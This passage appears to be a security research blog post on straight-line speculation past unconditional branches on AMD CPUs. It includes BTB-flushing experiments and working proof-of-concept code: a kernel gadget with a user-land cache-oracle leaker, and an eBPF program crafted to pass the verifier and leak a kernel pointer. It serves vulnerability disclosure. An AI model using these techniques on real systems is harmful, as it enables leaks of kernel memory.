</code></pre><p>As the results show, the misprediction rate reached an incredible level of 99.9% and remained stable throughout all the iterations.</p>
<h3 id="what-does-it-mean-">What does it mean?</h3>
<p><strong>It means we can easily and nearly 100% reliably make affected AMD CPUs mispredict any (even direct) unconditional branch and trigger SLS past it. All we need to do is make sure the corresponding BTB entry is not present upon the branch execution.</strong></p>
<p>In the below chart I collected misprediction rates observed on all Intel and AMD CPUs I tested this on.</p>
<p><img src="http://harihareswara.net/posts/2022/intuitions-around-trust-levels/amd_mispredictor_part_2/flush.svg"/></p>
<h3 id="have-you-looked-at-cross-hyper-thread-btb-entry-evictions-">Have you looked at cross-hyper-thread BTB entry evictions?</h3>
<p>Yes, I did. Below is the experiment I ran to quantify the cross-hyper-thread BTB flushing induced misprediction rate of direct unconditional branches.</p>
<p>I ran the following code on two co-located logical CPUs:</p>
<ul>
<li>The code executing on thread 2 constantly flushes the shared portion of the BTB.</li>
<li>The code executing on thread 1 runs a loop of 100k iterations ten times.</li>
</ul>
<h4 id="experiment-7">Experiment 7</h4>
<p>Thread 1:</p>
<pre><code>0. mov CACHE_LINE_0_ADDR, %rsi   ; memory address 0 whose access latency allows to observe the speculative execution
1. mov CACHE_LINE_1_ADDR, %rbx   ; memory address 1 whose access latency allows to observe the speculative execution
2. clflush (%rsi)
3. clflush (%rbx)                ; flush both cache lines out of cache hierarchy to get a clean state
<span>4.</span> mfence                        ; make sure the cache lines are really out

<span>5.</span> jmp END_LABEL                 ; goto END_LABEL
6. mov (%rsi / %rbx), %rax       ; memory load to the flushed cache line; it never executes architecturally
7. END_LABEL:

8. measure CACHE_LINE_0/1_ADDR access time
</code></pre>
<p>Thread 2:</p>
<pre><code><span>1</span>. <span>LOOP</span>:
<span>2</span>. flush_btb <span>8192</span>                ; flush entire BTB of <span>8192</span> entries
<span>3</span>. jmp <span>LOOP</span>
</code></pre>
<p>The result:</p>
<pre><code>CPU: AMD Ryzen <span>3</span> <span>4300</span>G with Radeon Graphics
Baseline: <span>200</span>
CL0,CL1,Iterations
<span>252</span>,  <span>0,100000</span>
 <span>83</span>,  <span>0,100000</span>
<span>252</span>,  <span>0,100000</span>
<span>251</span>,  <span>0,100000</span>
<span>263</span>,  <span>0,100000</span>
<span>252</span>,  <span>0,100000</span>
 <span>17</span>,  <span>0,100000</span>
<span>159</span>,  <span>0,100000</span>
<span>251</span>,  <span>0,100000</span>
<span>256</span>,  <span>0,100000</span>
Total: <span>2036</span>
  <span>0,246,100000</span>
  <span>0</span>,<span>258,100000</span>
  <span>0</span>, <span>95,100000</span>
  <span>0,179,100000</span>
  <span>0,255,100000</span>
  <span>0,191,100000</span>
  <span>0,115,100000</span>
  <span>0,254,100000</span>
  <span>0,249,100000</span>
  <span>0</span>,<span>258,100000</span>
Total: <span>2100</span>
</code></pre><p>Just for a reference, I also executed the experiment on the same two logical CPUs, where the thread 1 was identical and the thread 2 was executing an infinite empty loop (i.e. without deliberate BTB flushing). Obtained results showed fairly similar patterns to those of the experiment 2.</p>
<p>The above results confirm that the BTB component is competitively shared between the sibling hyper-threads of a core (i.e. colliding subsets of BTB entries can be flushed cross-thread) and that the cross-hyper-thread BTB flushing noticeably and reliably increases the direct unconditional branches misprediction rate. Based on the results, the misprediction rate induced by a cross-hyper-thread BTB flushing can be estimated to be in a range of 0.2% - 0.3%.</p>
<p>It might be an interesting research opportunity to come up with more efficient cross-hyper-thread BTB flushing schemes and compare resulting misprediction rates.</p>
<p>The charts below present the collected results of the above experiment executed on various AMD and Intel CPUs.</p>
<p><img src="http://harihareswara.net/posts/2022/intuitions-around-trust-levels/amd_mispredictor_part_2/crossflush.svg"/></p>
<h2 id="the-speculation-window-should-be-very-short-what-can-you-do-with-it-">The speculation window should be very short, what can you do with it?</h2>
<p>That is indeed the case. The direct unconditional branch speculation window is significantly shorter than the speculative window resulting from the misprediction of a conditional branch described in the previous article.</p>
<p>In my experiments, I could not get the speculative window to cover more than 16 bytes of x86 instructions. In addition, I quickly noticed that the alignment of the unconditional branch being speculated over within its cache line matters. These, somewhat unexpected, speculative window constraints make more sense when we look at the <em>AMD Software Optimization Guide</em> <a href="https://developer.amd.com/wp-content/resources/56305.zip">[7]</a> section &#34;Instruction Fetch and Decode&#34;:</p>
<p>&#34;<em>The processor fetches instructions from the instruction cache in 32-byte naturally aligned blocks. The processor can perform an instruction block fetch every cycle. The fetch unit sends these bytes to the decode unit through a 20 entry Instruction Byte Queue (IBQ), each entry holding <strong>16 instruction bytes</strong>. [...] The decode unit scans two of these windows in a given cycle, decoding a maximum of four instructions. [...] <strong>The pick window is 32 bytes, aligned on a 16-byte boundary</strong>. Having 16 byte aligned branch targets gets maximum picker throughput and avoids end-of-cacheline short op cache (OC) entries. [...]</em>&#34;</p>
<p>There is also the following figure 1. in section &#34;Cache Line, Fetch and Data Type Widths&#34;:</p>
<p><img src="http://harihareswara.net/posts/2022/intuitions-around-trust-levels/amd_mispredictor_part_2/cacheline.png"/></p>
<p>Naturally, I was observing the longest speculative window, when the unconditional branch instruction was 16-byte aligned and correspondingly shorter otherwise. Apparently, as the empirical observations suggest, when the BPU mispredicts the branch resulting in the fall-through SLS behavior due to a missing BTB entry, there is a limit on the number of decoded instructions (uops) that can escape to the backend&#39;s execution units. In my experiments, I managed to speculatively execute up to 8 simple and short x86 instructions, whose total length must be within the 16-byte range limit.</p>
<p>This is however not the only limitation. The frontend gets re-steered much quicker when it mispredicts the unconditional branch. Only the uops that successfully escape get executed, provided they find their available execution units in time. In the <em>AMD Software Optimization Guide</em> <a href="https://developer.amd.com/wp-content/resources/56305.zip">[7]</a> section &#34;Execution Units&#34; we can see:</p>
<p>&#34;<em>The processor contains <strong>4 integer execution pipes</strong>. There are <strong>four ALUs</strong> capable of all integer operations with the exception of multiplies, divides, and CRC which are dedicated to <strong>one ALU each</strong>.&#34;</em></p>
<p>In my experiments, I indeed observed that congestion on the available execution units prevents more complex or competing uops from getting speculatively executed under SLS. Therefore, one needs to pick the instruction to be executed carefully.
In practice, especially without control of the branch alignment, this reduces the speculative window to 4-5 simple x86 instructions (with an average of 12 bytes of the sum of the instructions&#39; lengths).</p>
<p>Moreover, there is a limit to the number of memory load and store instructions that can get executed. In the <em>AMD Software Optimization Guide</em> <a href="https://developer.amd.com/wp-content/resources/56305.zip">[7]</a> section &#34;Execution Units&#34; we can also see:</p>
<p>&#34;<em>There are 3 AGUs for address generation. Two of them (AGU0/AGU1) can generate load addresses, while all three (AGU0/AGU1/AGU2) can generate store addresses.</em>&#34;</p>
<p>I confirmed the above statement by not being able to observe more than two memory load instructions executed under SLS.</p>
<p>There is also a much more severe limitation. As confirmed by AMD and also by my experiments, <strong>no memory load can return data to the dependent uops within the speculative window in time</strong> (with a little caveat, that I will discuss later). This means that constructing a Spectre v1 gadget for instance, fully confined to the speculative window, is not feasible. This in turn means that <strong>the secret data has to be already architecturally loaded from memory or otherwise readily available in a GPR</strong> (General Purpose Register). </p>
<p><strong>The memory loads, however, do get scheduled and can perform a cache line fetch into the cache hierarchy</strong>. This means that they do leave architecturally-observable traces of their speculative execution. This makes it possible to leak bits of information whenever secret data is available to the SLS uops or to construct a cache oracle.</p>
<p>A similar principle applies to memory stores: they do not leave architecturally observable traces in the cache hierarchy, but they can make the data being stored available in the Store Buffer. </p>
<h3 id="does-the-secret-really-have-to-be-in-a-gpr-">Does the secret really have to be in a GPR?</h3>
<p>Not necessarily. I observed that the memory loads executed under SLS are capable of providing data to the dependent uops within the SLS speculation window as soon as there was a corresponding memory store executed previously (architecturally or speculatively). This is possible thanks to the Store-to-Load Forwarding (STLF) feature of modern CPUs.</p>
<p>In the <em>AMD Software Optimization Guide</em> <a href="https://developer.amd.com/wp-content/resources/56305.zip">[7]</a> section &#34;Load-Store Unit&#34; we can also see:</p>
<p>&#34;<strong>*The LS unit supports store-to-load forwarding (STLF) when there is an older store that contains all of the load&#39;s bytes</strong>, and the store&#39;s data has been produced and is available in the store queue. The load does not require any particular alignment relative to the store or to the 64B load alignment boundary
as long as it is fully contained within the store.
<strong>The processor uses address bits 11:0 to determine STLF eligibility</strong>. Avoid having multiple stores with the same 11:0 address bits, but to different addresses (different 47:12 bits) in-flight simultaneously where a load may need STLF from one of them. <strong>Loads that follow stores to similar address space should use the same registers and accesses should be grouped closely together</strong>, avoiding intervening modifications or writes to the base or index register used by the store and load when possible. Also, minimize displacement values such that the range will fit within 8 bits when possible.*&#34;&#34;</p>
<p>It essentially means that whenever data is available in the store queue, produced by an earlier store operation (even speculative), the following memory load which fulfills STLF-eligibility requirement (same memory address bits 11:0 between the load and store) will get the data. In addition, as I observed, it will get the data quick enough to still be able to provide it to the following uops within the SLS speculative window.</p>
<p>This means that the secret data does not have to be in the GPR for the potential SLS gadget to be able to leak it. It can also be obtained from the store queue, when an SLS gadget contains an STLF-eligible memory load.</p>
<p>This slightly extends the somewhat limited capability of the unconditional branch based SLS gadgets.</p>
<h3 id="what-do-we-know-about-the-speculative-window-so-far-">What do we know about the speculative window so far?</h3>
<p>To summarize, this is what we know about the unconditional branch SLS speculation window:</p>
<ul>
<li>up to 8 simple and short (up to 16 bytes) x86 instructions can be speculatively executed<ul>
<li>in practice: 4-5 short x86 instructions that do not compete for execution units</li>
</ul>
</li>
<li>up to 2 memory loads can be executed speculatively<ul>
<li>the loads (even pre-cached) cannot provide data to the following uops in time</li>
<li>the loads do get scheduled and can leave traces in cache hierarchy</li>
</ul>
</li>
<li>STLF-eligible memory loads can provide data to the following uops if there was an earlier store</li>
</ul>
<p>Given the above, constructing a full Spectre v1 gadget is not possible with this type of SLS. It is, however, possible to construct an information leaking gadget as soon as secret data is available in registers or has been previously stored to a gadget-accessible memory address.</p>
<h2 id="it-s-all-nice-but-what-can-you-really-do-with-it-">It&#39;s all nice, but what can you really do with it?</h2>
<p>With the limitations of the unconditional branch SLS imposed on code gadgets, it is rather difficult to find and exploit existing code constructs fulfilling all the requirements. Nevertheless, due to the ubiquitous nature of the unconditional branches (especially <code>CALL</code> instructions) in large code bases like the Linux kernel, the existence of such gadgets cannot be ruled out. Whenever such a gadget is identified, it might be easily exploitable on AMD CPUs because of the simple way to trigger SLS on unconditional branches on these processors (BTB flushing).</p>
<p>Here, I will discuss and exploit a fake gadget I manually constructed in the Linux kernel for the sake of demonstration. I hope this helps in visualizing the potential structure of such gadgets in existing binary code and increases awareness for those inspecting the code.</p>
<p>For this PoC, I will manually insert a seemingly benign code construct that can be executed without errors on any workload and does not have relevant architectural side-effects. For the exercise, I will use an otherwise unmodified vanilla 5.15 Linux kernel and create a user-land program exploiting the SLS gadget.</p>
<p>In order to demonstrate the abuse of the STLF feature by a SLS gadget, I will have the kernel code storing a &#34;secret&#34; 8 bytes into a stack variable, followed by an <code>SFENCE</code> and <code>LFENCE</code> instruction sequence. The storing part is the only architecturally executed code. The actual SLS gadget code never executes architecturally, because of the direct unconditional jump instruction ignoring it.</p>
<p>I chose to augment a <code>readlinkat()</code> system call handler with the following code:</p>
<pre><code>--- a/fs/stat.c
+++ b/fs/stat.c
@@ <span>-461</span>,<span>6</span> +<span>461</span>,<span>22</span> @@ <span>static</span> <span>int</span> do_readlinkat(<span>int</span> dfd, <span>const</span> <span>char</span> __user *pathname,
                        <span>goto</span> retry;
                }
        }
+
+       <span>asm</span> <span>goto</span> (
+               <span>&#34;mov $0x4141414141414141, %%rbx\n&#34;</span>
+               <span>&#34;mov %%rbx, (%0)\n&#34;</span>
+               <span>&#34;sfence\n&#34;</span>
+               <span>&#34;lfence\n&#34;</span>
+               <span>&#34;.align 64\n&#34;</span>
+               <span>&#34;jmp %l[end]\n&#34;</span>
+               <span>&#34;mov (%0), %%rbx\n&#34;</span>
+               <span>&#34;and %1, %%rbx\n&#34;</span>
+               <span>&#34;add %2, %%rbx\n&#34;</span>
+               <span>&#34;mov (%%rbx), %%ebx\n&#34;</span>
+               :: <span>&#34;r&#34;</span> (&amp;path), <span>&#34;r&#34;</span> (<span>1</span>UL &lt;&lt; bufsiz), <span>&#34;r&#34;</span> (buf)
+               : <span>&#34;rbx&#34;</span>, <span>&#34;memory&#34;</span>
+               : <span>end</span>);
+<span>end</span>:
        <span>return</span> error;
 }
</code></pre>
<p>The handler can be invoked by the <code>readlinkat()</code> system call and conveniently allows to directly pass two parameters from the user to the kernel:</p>
<ol>
<li>Cache oracle address (via <code>buf</code> paramater)</li>
<li>Bit or byte of the secret to be leaked (via <code>bufsiz</code> parameter)</li>
</ol>
<p>The first part of the code performs the &#34;secret&#34; data store into a stack variable:</p>
<pre><code>+               <span>&#34;mov $0x4141414141414141, %%rbx\n&#34;</span>   ; generate fake secret data
+               <span>&#34;mov %%rbx, (%0)\n&#34;</span>                  ; store the secret data <span>into</span> a stack <span>variable</span>
+               <span>&#34;sfence\n&#34;</span>                           ; memory store barrier
+               <span>&#34;lfence\n&#34;</span>                           ; memory load and op. <span>dispatch</span> barrier
</code></pre>
<p>Notice, the <code>SFENCE</code> and <code>LFENCE</code> instruction acting as memory ordering and speculative execution barriers. The store does occur architecturally, before the SLS gadget has a chance to execute.</p>
<p>The gadget introduces a cache line aligned direct unconditional branch:</p>
<pre><code>+               <span>&#34;.align 64<span>\n</span>&#34;</span>
+               <span>&#34;jmp %l[end]<span>\n</span>&#34;</span>
</code></pre>
<p>Which guarantees that the following code never executes architecturally:</p>
<pre><code>+               <span>&#34;mov (%0), %%rbx\n&#34;</span>       ; load the secret data from store queue using STLF
+               <span>&#34;and %1, %%rbx\n&#34;</span>         ; cut out a single bit from the secret using a mask derived from bufsiz parameter
+               <span>&#34;add %2, %%rbx\n&#34;</span>         ; add the resulting bit to the address of the cache oracle cache line
+               <span>&#34;mov (%%rbx), %%ebx\n&#34;</span>    ; touch the cache oracle cache line
</code></pre>
<p>Despite the memory ordering and serialization instructions, STLF can still occur, supplying data to the SLS gadget.
In fact, the main reason why I placed the <code>SFENCE</code> and <code>LFENCE</code> serializing instructions in front of the SLS gadget in the above PoC was to demonstrate how easy it might be to fall into a false sense of security by placing such instructions carelessly. STLF, for example, can &#34;bypass&#34; the serialization and memory store ordering instructions and still supply data to gadgets. Naturally, such SLS gadgets also work perfectly fine without the memory and serialization barrier instructions.</p>
<p>The SLS gadget only detects 0 bits (as in, non-1 in a binary sense) of the secret and transmits their occurrence via the cache oracle covert channel. It is able to reliably leak bits 6 to 47 of the secret data.</p>
<p>For a more detailed description of the cache oracle used in this SLS gadget, please see the previous blog article, section: &#34;<em>It&#39;s all nice, but what can you really do with it?</em>&#34;, where I use and explain the very same method.</p>
<p>The user-land program I used to exploit the SLS gadgets looked like this:</p>
<pre><code>cache_line_t *cl = &amp;channel.lines[CACHE_LINE1];


baseline = cache_channel_baseline(cl);

uint64_t result = <span>0</span>, old_result = <span>0</span>;

<span>while</span> (<span>1</span>) {
    <span>for</span> (<span>unsigned</span> <span>char</span> <span>bit</span> = <span>6</span>; <span>bit</span> &lt; <span>48</span>; <span>bit</span>++ ) {
        flusher();
        clflush(cl);
        mfence();

        readlinkat(AT_FDCWD, <span>&#34;.&#34;</span>, (<span>char</span> *) cl, <span>bit</span>);

        <span>int</span> oracle = cache_channel_measure_bit(cl, baseline);
        <span>if</span> (oracle == ZERO)
            result |= (<span>1</span>UL &lt;&lt; <span>bit</span>);

        <span>if</span> (result != old_result) {
            printf(<span>&#34;Result: %016lx\n&#34;</span>, result ^ <span>0x0000ffffffffffc0</span>);
            old_result = result;
        }
    }
}
</code></pre>
<p>The <code>flusher()</code> is the exact same routine as the <code>flush_tlb</code> macro from the above experiments:</p>
<pre><code>asm volatile (
    <span>&#34;.align 64<span>\n</span>    &#34;</span>
    <span>&#34;.rept 8192<span>\n</span>   &#34;</span>
    <span>&#34;    jmp 1f<span>\n</span>   &#34;</span>
    <span>&#34;    .rept 30<span>\n</span> &#34;</span>
    <span>&#34;        nop<span>\n</span>  &#34;</span>
    <span>&#34;    .endr<span>\n</span>    &#34;</span>
    <span>&#34;1:  jmp 2f<span>\n</span>   &#34;</span>
    <span>&#34;    .rept 29<span>\n</span> &#34;</span>
    <span>&#34;        nop<span>\n</span>  &#34;</span>
    <span>&#34;    .endr<span>\n</span>    &#34;</span>
    <span>&#34;2:  nop<span>\n</span>      &#34;</span>
    <span>&#34;.endr<span>\n</span>        &#34;</span>
);
</code></pre>
<p>The PoC flushes the cache oracle cache line out of the cache hierarchy and invokes the <code>readlinkat</code> system call with an arbitrary <code>pathname</code> parameter, cache line <code>cl</code> as the <code>buf</code> parameter and a bit number as the <code>bufsiz</code> parameter. Next, cache line <code>cl</code> access latency is measured and in case of it being touched by the SLS gadget (access time below the baseline), secret data bit is 0 at the specified bit position. The procedure is repeated for all bits 6 to 47.</p>
<p>To simplify the creation of the cache oracle, I disabled the <code>SMAP</code> feature in order to allow the kernel to directly access user-land memory.</p>
<p>I ran this PoC with a single logical CPU affinity on the following AMD CPU:</p>
<pre><code>CPU family:                      <span>23</span>
Model:                           <span>96</span>
Model name:                      AMD Ryzen <span>3</span> <span>4300</span>G with Radeon Graphics
</code></pre><p>Result:</p>
<pre><code>wipawel<span>@pawel</span>-<span>poc:</span>~$ time taskset -c <span>2</span> ./readlink 
Baseline: <span>200</span>
Secret: <span>4141414141414141</span>
Result: <span>0000ffffffffff40</span>
Result: <span>0000ffffffefff40</span>
Result: <span>0000fdffffefff40</span>
Result: <span>0000fdffffeff740</span>
Result: <span>0000fddfffeff740</span>
Result: <span>0000fddbffeff740</span>
Result: <span>0000fddbfbeff740</span>
Result: <span>0000fddbfbe7f740</span>
Result: <span>0000fd5bfbe7f740</span>
Result: <span>0000fd5b7be7f740</span>
Result: <span>0000fd5b7be7f540</span>
Result: <span>0000fd5b7be7e540</span>
Result: <span>0000fd5b7be5e540</span>
Result: <span>0000fd5b7be1e540</span>
Result: <span>0000fd5b7be1c540</span>
Result: <span>0000fd4b7be1c540</span>
Result: <span>0000fd437be1c540</span>
Result: <span>0000f5437be1c540</span>
Result: <span>0000f5437bc1c540</span>
Result: <span>0000f5417bc1c540</span>
Result: <span>0000f54179c1c540</span>
Result: <span>0000f54169c1c540</span>
Result: <span>0000e54169c1c540</span>
Result: <span>0000c54169c1c540</span>
Result: <span>0000c5416941c540</span>
Result: <span>0000c5414941c540</span>
Result: <span>0000c54149414540</span>
Result: <span>0000c54149414140</span>
Result: <span>0000c14149414140</span>
Result: <span>0000414149414140</span>
Result: <span>0000414141414140</span>

real    0m14.620s
user    0m11.650s
sys    0m2.875s
</code></pre>
<p>This particular PoC example took nearly 15s to leak the 6 bytes of secret data. According to other experiments, the main reason of the slowdown can be attributed to the serializing <code>LFENCE</code> instruction (again, added here purely for demonstration purposes) and the sub-optimal BTB flushing scheme. In my experiments without the <code>LFENCE</code> I was able to leak the 6 bytes within 1-2 seconds and without STLF (secret data directly in GPR) within 100-500 milliseconds.</p>
<p>In addition, the majority of the runtime is spent on the BTB flushing procedure, whose latency accumulates with the increase of iterations needed to leak bits. Certainly, better BTB flushing schemes can render much better timing results.</p>
<p>Notice, however, how very little was needed for the user-land part of the PoC to exploit the SLS gadget. On AMD CPUs, potentially existing SLS gadgets can be rather easily exploited as soon as a reliable cache oracle can be established.</p>
<h3 id="i-do-not-see-any-real-gadgets-what-else-can-you-do-">I do not see any real gadgets, what else can you do?</h3>
<p>Now, let&#39;s see if we can somehow create and inject an SLS gadget from an unprivileged user-land program. Naturally, the obvious choice for such effort is almost always the infamous eBPF. I will use the latest stable vanilla Linux kernel version, without any modifications. The Linux kernel&#39;s eBPF verifier has received lately several improvements, like for example conditional branch hardening against speculative execution (discussed in our previous blog), but how does it handle direct unconditional branch SLS? Let&#39;s find out.</p>
<p>Since Linux kernel version v4.4, unprivileged users can load their eBPF programs into the kernel to facilitate a feature called &#34;socket filtering&#34;. Although it is possible to disable this capability at runtime (using the <code>unprivileged_bpf_disable</code> system control option), many Linux distributions still (at the time of this writing at least) do not do that by default. This means an unprivileged user can open a network socket (for example to send UDP packets) and attach its own eBPF program that gets executed by the Linux kernel (with its higher privilege) every time data travels via the socket.</p>
<p>Due to the limited capabilities of the SLS gadgets and for the sake of shortening the proof-of-concept demonstration, I will focus on constructing a simple eBPF-injected gadget capable of leaking the lowmem heap kernel memory pointer value of the <code>BPF_MAP</code> allocation. Choosing the <code>BPF_MAP</code> allocation pointer  simplifies the PoC significantly as eBPF programs have easy and direct access to the pointer value. In addition to that, it allows us to easily verify the PoC leak accuracy, by comparing the leaked value to the actual kernel pointer value available in the eBPF program JIT dump (e.g. obtained via the <code>bpftool</code> program). The same method can be used to leak any other secret data the eBPF program&#39;s register set has access to.</p>
<p>Here is a step-by-step walkthrough of how I implemented this:</p>
<p>First, I open a UDP datagram socket to get a fast mechanism for passing data via the socket and triggering my eBPF program executions:</p>
<pre><code><span>sock</span> = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
</code></pre>
<p>Then, I create the usual cache oracle primitives and calculate the cache access latency baseline:</p>
<pre><code><span>cache_line_t </span>*cl

<span>cache_channel_t </span>*channel = mmap(<span>ADDR_32BIT, </span>sizeof(*channel), PROT_READ, MAP_PRIVATE <span>| MAP_FIXED |</span> MAP_ANONYMOUS, -<span>1</span>, <span>0</span>)
if (channel == MAP_FAILED) {
    printf(<span>&#34;Channel mapping failed\n&#34;</span>)
    return <span>1</span>
}

cl = &amp;channel-&gt;lines[<span>CACHE_LINE1];
</span>
<span>baseline </span>= <span>cache_channel_baseline(cl);</span>
</code></pre>
<p>To make things simpler, I chose an arbitrary memory address within the first 4GB of address space (the <code>ADDR_32BIT</code>), because most eBPF instructions are limited to 32-bit immediate operands.</p>
<p>Next, I use <code>libbpf</code>&#39;s API to create a BPF MAP object of type <code>BPF_MAP_TYPE_ARRAY</code> to be used for passing data between the user-land program and the eBPF program in the kernel:</p>
<pre><code><span>#<span>define</span> NUM_ELEMS 6</span>

<span>int</span> key;
<span>long</span> <span>long</span> <span>value</span>;

map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span>sizeof</span>(key), <span>sizeof</span>(<span>value</span>), NUM_ELEMS, <span>0</span>);
if (map_fd &lt; <span>0</span>)
    <span>goto</span> error;
</code></pre>
<p>The biggest challenge was constructing the kernel pointer leaking SLS gadget that gets accepted by the eBPF verifier. Because the resulting eBPF program must be JIT compiled by the kernel in a way that preserved the functionality of the SLS gadget and must not be accidentally destroyed by the eBPF verifier&#39;s optimizations, I had to assemble it manually following the eBPF pseudo-machine code closely. To make this process easier, I used the eBPF instruction mini library from the Linux kernel&#39;s <code>samples/bpf/bpf_insn.h</code> file. A good description of the eBPF pseudo-machine architecture is available in the Linux kernel&#39;s documentation: <a href="https://www.kernel.org/doc/Documentation/networking/filter.txt">[8]</a>.</p>
<p>Here is the actual code I developed:</p>
<pre><code>struct bpf_insn prog[] = {
    

    
    BPF_MOV64_IMM(BPF_REG_0, <span>1</span>),
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span>-24</span>),

    
    BPF_LD_MAP_FD(BPF_REG_1, map_fd),

    
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span>-24</span>),

      
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span>0</span>, <span>0</span>, <span>0</span>, BPF_FUNC_map_lookup_elem),

    
    BPF_MOV64_IMM(BPF_REG_9, <span>0</span>),

    
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span>0</span>, <span>1</span>),

    
    BPF_LDX_MEM(BPF_W, BPF_REG_9, BPF_REG_0, <span>0</span>),

    

    
    BPF_MOV64_REG(BPF_REG_4, BPF_REG_9),
    BPF_MOV64_IMM(BPF_REG_7, <span>0x1</span>),
    BPF_ALU64_REG(BPF_LSH, BPF_REG_7, BPF_REG_4),
    BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),

     
    BPF_MOV64_IMM(BPF_REG_6, (uint32_t) (uint64_t) cl),

    
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),

    
    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, <span>0x200000</span>, <span>5</span>), -------------------------+
                                                                           |
                                                                        |
    BPF_MOV64_REG(BPF_REG_0, BPF_REG_10),                                  |
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, <span>-24</span>),                                |
                                                                           |
                        |
    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                      |
                                                                           |
                                                                        |
+-- BPF_RAW_INSN(BPF_JMP, <span>0</span>, <span>0</span>, <span>4</span>, <span>0</span>),                                     |
|                                                                          |
|                            |
|   BPF_ALU64_REG(BPF_AND, BPF_REG_1, BPF_REG_4), &lt;------------------------+
|
|   
|   BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_1),
|
|   
|   BPF_MOV64_REG(BPF_REG_0, BPF_REG_6),
|   
|   
|   BPF_RAW_INSN(BPF_JMP, <span>0</span>, <span>0</span>, <span>1</span>, <span>0</span>), ------------------------------------+
|                                                                          |
|                                                                       |
+-&gt; BPF_LDX_MEM(BPF_W, BPF_REG_1, BPF_REG_0, <span>0</span>),                           |
                                                                           |
                          |
    BPF_MOV64_IMM(BPF_REG_0, <span>0x0</span>), &lt;---------------------------------------+
    BPF_EXIT_INSN(),
};

size_t insns_cnt = sizeof(prog) / sizeof(struct bpf_insn);
</code></pre>
<p>The resulting x86 assembly code, after eBPF JIT compilation looks like this:</p>
<pre><code>; Function prologue  
   <span>0</span>:    nopl   <span>0x0</span>(%rax,%rax,<span>1</span>)
   <span>5</span>:    xchg   %ax,%ax
   <span>7</span>:    <span>push</span>   %rbp
   <span>8</span>:    mov    %rsp,%rbp
   b:    <span><span>sub</span>    $0<span>x18</span>,%<span>rsp</span>
  12:    <span>push</span>   %<span>rbx</span>
  13:    <span>push</span>   %<span>r13</span>
  15:    <span>push</span>   %<span>r15</span>

</span>; Load bit position of a secret from the BPF <span>map</span>  
  <span>17</span>:    mov    $0x1,%eax
  <span>1</span>c:    mov    %eax,-<span>0x18</span>(%rbp)
  <span>1</span>f:    lfence 
  <span>22</span>:    movabs $0xffff9f16c2ee760<span>0</span>,%rdi
  <span>2</span>c:    mov    %rbp,%rsi
  <span>2</span>f:    add    $0xffffffffffffffe8,%rsi
  <span>33</span>:    add    $0x11<span>0</span>,%rdi
  <span>3</span>a:    mov    <span>0x0</span>(%rsi),%eax
  <span>3</span>d:    cmp    $0x6,%rax
  <span>41</span>:    jae    <span>0x000000000000004f</span>
  <span>43</span>:    and    $0x7,%eax
  <span>46</span>:    shl    $0x3,%rax
  <span>4</span>a:    add    %rdi,%rax
  <span>4</span>d:    jmp    <span>0x0000000000000051</span>
  <span>4</span>f:    <span>xor</span>    %eax,%eax
  <span>51</span>:    <span>xor</span>    %r15d,%r15d
  <span>54</span>:    test   %rax,%rax
  <span>57</span>:    je     <span>0x000000000000005d</span>
  <span>59</span>:    mov    <span>0x0</span>(%rax),%r15d

; Bit position bitmask calculation
  <span>5</span>d:    mov    %r15,%rcx
  <span>60</span>:    mov    $0x1,%r13d
  <span>66</span>:    shl    %cl,%r13
  <span>69</span>:    mov    %r13,%rcx

; Cache oracle cache line address stored in %rbx  
  <span>6</span>c:    mov    $0x400f8<span>0</span>,%ebx

; Moving an integer value into %rdi to satisfy eBPF verifier arithmetic operations requirement
  <span>71</span>:    mov    %r13,%rdi

; A conditional never taken branch to satisfy eBPF verifier unreachable instructions requirement
  <span>74</span>:    cmp    $0x20000<span>0</span>,%r15
  <span>7</span>b:    jae    <span>0x0000000000000090</span>
  <span>7</span>d:    mov    %rbp,%rax
  <span>80</span>:    add    $0xffffffffffffffe8,%rax

; Kernel memory pointer (secret) transfered to a GPR
  <span>84</span>:    movabs $0xffff9f16c2ee760<span>0</span>,%rdi

; First direct unconditional branch
  <span>8</span>e:    jmp    <span>0x000000000000009b</span>        -+
  <span>90</span>:    and    %rcx,%rdi                  |
  <span>93</span>:    add    %rdi,%rbx                  |
  <span>96</span>:    mov    %rbx,%rax                  |
                                           |
; Second direct unconditional branch       +- <span>0x9e</span> - <span>0x8e</span> = <span>0x10</span> (<span>16</span> bytes)
  <span>99</span>:    jmp    <span>0x000000000000009e</span>         |
  <span>9</span>b:    mov    <span>0x0</span>(%rax),%edi             |
                                           |
; Return value setting                     |
  <span>9</span>e:    <span>xor</span>    %eax,%eax                 -+

; Function epilogue
  a<span>0</span>:    <span>pop</span>    %r15
  a2:    <span>pop</span>    %r13
  a4:    <span>pop</span>    %rbx
  a5:    leaveq 
  a6:    retq
</code></pre>
<p>The core of the eBPF injected SLS gadget is similar to the fake gadget I used in the previous example. In order to trick the eBPF verifier into accepting the eBPF program, I had to use two direct unconditional branches and a single never taken conditional branch to enable all control flow execution paths (the eBPF verifier rejects unprivileged programs with loops and unreachable basic blocks). This imposed the need to trigger SLS upon two closely placed unconditional branches, which happens nearly automatically when the BTB flushing method is used. The conditional branch is effectively never taken, because its condition is never true for the range of values supplied to the <code>r9</code> register. In addition, because the <code>r9</code> register values are dynamically provided to the eBPF program, the static eBPF verifier cannot assume any maximum or minimum values of <code>r9</code> and cannot optimize out the conditional branch. Even though the conditional branch is (effectively) never taken, it enables a potential control flow into the basic block following the first unconditional branch. The first unconditional branch enables potential control flow into the second unconditional branch&#39;s basic block. Neither of the basic blocks however execute architecturally when the conditional branch remains not taken. The eBPF verifier on the other hand considers all basic blocks as reachable and therefore accepts the program.</p>
<p>When the SLS occurs on both of the unconditional branches. the resulting speculatively executed code looks as follows:</p>
<pre><code>; kernel memory pointer stored in %rdi
movabs $0xffff9f16c2ee7600,%rdi

; bit position bitmask applied to the secret
and    %rcx,%rdi

; cache oracle cache line memory access scheduled
add    %rdi,%rbx                  
mov    %rbx,%rax                  
mov    <span>0x0</span>(%rax),%edi
